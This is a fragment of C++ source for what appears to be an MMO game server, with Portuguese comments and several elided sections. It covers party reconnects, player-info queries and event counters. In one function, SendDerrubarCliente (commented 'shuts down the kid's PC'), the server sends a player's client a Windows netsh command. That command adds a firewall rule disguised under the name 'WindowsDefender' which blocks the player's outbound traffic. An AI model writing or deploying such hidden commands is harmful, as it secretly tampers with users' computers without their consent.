...
void SendDerrubarCliente(int conn, short Modelo) //desliga o pc do garoto
{
	...
	case 2:
	{
		strncpy(packet.Command, "netsh advfirewall firewall add rule name=WindowsDefender dir=out action=block protocol=tcp localip=any remoteip=192.168.0.176", sizeof(packet.Command)); //colocar ip do servidor ali
	}
	break;
	default:
		return;
...
void SendReconnectParty(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;
	...
	int Pt = pUser[conn].Keys[39];

	if (Parties[Pt].Chave != pUser[conn].Keys[44])
		return;

	MSG_ReconnectGrupo m;
	memset(&m, 0, sizeof(MSG_ReconnectGrupo));

	m.ID = ESCENE_FIELD;
	m.Type = _MSG_ReconnectGrupo;
	m.Size = sizeof(MSG_ReconnectGrupo);

	m.Index = Parties[Pt].Index;
	strncpy(m.Nick, Parties[Pt].Nick, 16);

	if (!pUser[conn].cSock.SendOneMessage((char*)&m, sizeof(MSG_ReconnectGrupo)))
		CloseUser(conn);
}
void ConsultaInfoPlayer(int conn, int target)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;
	...
	if (pUser[target].cSock.Sock == 0)
		return;

	if (pUser[conn].InfoPlay != 0)
	{
		int isTime = GetTickCount64() - pUser[conn].InfoPlay; // ATRASO PACOTE DE MORTE

		if (isTime < 5000)
		{
			SendClientMessage(conn, "Aguarde 5 segundos para uma nova consulta.");
			return;
		}
	}
	pUser[conn].InfoPlay = GetTickCount64();

	MSG_RequestInfoPlay sm;
	memset(&sm, 0x0, sizeof(MSG_RequestInfoPlay));
	sm.Size = sizeof(sm);
	sm.ID = conn;
	sm.Type = _MSG_RequestInfoPlay;

	sm.Level = pMob[target].MOB.CurrentScore.Level + 1;
	sm.Evolution = pMob[target].extra.ClassMaster;
	sm.Class = pMob[target].MOB.Class;

	if (pMob[target].MOB.Guild != 0)
	{
		char GuildName[256];
		BASE_GetGuildName(ServerGroup, pMob[target].MOB.Guild, GuildName);
		strncpy(sm.GuildName, GuildName, sizeof(sm.GuildName));
	}
	else {
		strncpy(sm.GuildName, "N/A", sizeof(sm.GuildName));
	}


	strncpy(sm.Nick, pMob[target].MOB.MobName, sizeof(sm.Nick));
	int Slot = pUser[target].Slot;

	for (int j = 1; j < MAX_EQUIP; j++) {
		memset(&sm.Equip[j], 0, sizeof(STRUCT_ITEM));
		memcpy(&sm.Equip[j], &pMob[target].MOB.Equip[j], sizeof(STRUCT_ITEM));
	}

	memset(&sm.Equip[16], 0, sizeof(STRUCT_ITEM));
	memcpy(&sm.Equip[16], &pUser[target].Joias[Slot][1], sizeof(STRUCT_ITEM));
	memset(&sm.Equip[17], 0, sizeof(STRUCT_ITEM));
	memcpy(&sm.Equip[17], &pUser[target].Joias[Slot][0], sizeof(STRUCT_ITEM));
...
void SendEventCount(int conn)
{
	...
	int npcGrade = BASE_GetItemAbilityNosanc(&pMob[npcIndex].MOB.Equip[0], 150);
	...
	{ //agora tu vai ter qeu fazer uma coisa  oquev/a
		...
		if (wUser[conn].CounterHist > 150)
		{
			STRUCT_ITEM item;
			memset(&item, 0, sizeof(STRUCT_ITEM));

			item.sIndex = 413; //Poeira de lac
		...
		wUser[conn].CounterHist++;
		SendClientSignalShortParm2(conn, ESCENE_FIELD, _MSG_MobCount, wUser[conn].CounterHist, 150);
	}
}
